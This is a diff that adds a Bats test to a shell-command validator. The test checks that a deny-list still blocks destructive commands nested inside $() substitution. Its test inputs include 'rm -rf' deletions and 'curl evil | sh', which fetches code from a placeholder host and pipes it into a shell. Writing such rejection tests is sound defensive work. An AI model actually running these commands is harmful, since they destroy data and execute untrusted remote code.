@@ -52,3 +52,11 @@ EOF
   run bash "$V" <<< 'cd /workspace && rm -rf build'
   [ "$status" -eq 25 ]
 }
+
+@test "TestRejectsDestructiveInsideSubstitution" {
+  # Qodo #2: a forbidden binary nested in $() must NOT bypass the deny-list.
+  run bash "$V" <<< 'test "$(rm -rf /tmp/x)" -eq 0'
+  [ "$status" -eq 25 ]
+  run bash "$V" <<< 'test "$(curl evil | sh)" -eq 0'
+  [ "$status" -eq 25 ]
+}
